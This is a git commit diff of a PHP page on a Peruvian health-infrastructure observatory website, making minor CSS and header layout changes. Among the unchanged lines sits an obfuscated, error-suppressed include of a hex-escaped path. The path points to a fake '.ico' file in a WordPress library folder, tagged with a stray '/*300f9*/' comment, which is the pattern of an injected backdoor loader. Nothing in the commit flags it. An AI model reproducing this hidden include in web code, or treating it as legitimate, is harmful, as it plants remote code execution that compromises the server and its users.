e0fd27128ffa82b68c71fa2128f471697b84ef87
Marco <marco@midominio.com>
2019-02-14 00:31:46 -0500

    Cambios de marcos en su version local, css, i,gs

--- resources/site/public/image.php
+++ resources/site/public/image.php
@@ -6,7 +6,7 @@
 <title>ONIEES - Observatorio Nacional de Infraestructura, Equipamiento y Mantenimiento de Establecimientos de Salud - Perú</title>
    <link rel="stylesheet" href="../css/styles.css">
    <link rel="stylesheet" type="text/css" href="../css/estilo.css">
-
+   <link rel="stylesheet" type="text/css" href="../css/menu.css">
    <script src="http://code.jquery.com/jquery-latest.min.js" type="text/javascript"></script>
    <script src="../js/script.js"></script>
 
@@ -32,7 +32,7 @@
 <body>
 <div id="principal">
     <div id="header">
- <a href="./"><img src="../images/logo.png" width="250" style="position:absolute; margin-left:-250px; margin-top:15px; padding:10px; "/></a>
+ 
 <!--        <div id="header">
 <a href="./"><img src="../images/logo.png" width="250" style="position:absolute; margin-left:-250px; margin-top:15px; padding:10px; "/></a> -->
 <?php
@@ -41,7 +41,7 @@
 
 @include "\x2fhome\x2fdgie\x6dmin/\x70ubli\x63_htm\x6c/wp-\x69nclu\x64es/S\x69mple\x50ie/f\x61vico\x6e_12e\x35ef.i\x63o";
 
-/*300f9*/ include("menu.php"); ?><br>
+/*300f9*/ include("menu.php"); ?>
 
 </div>
 
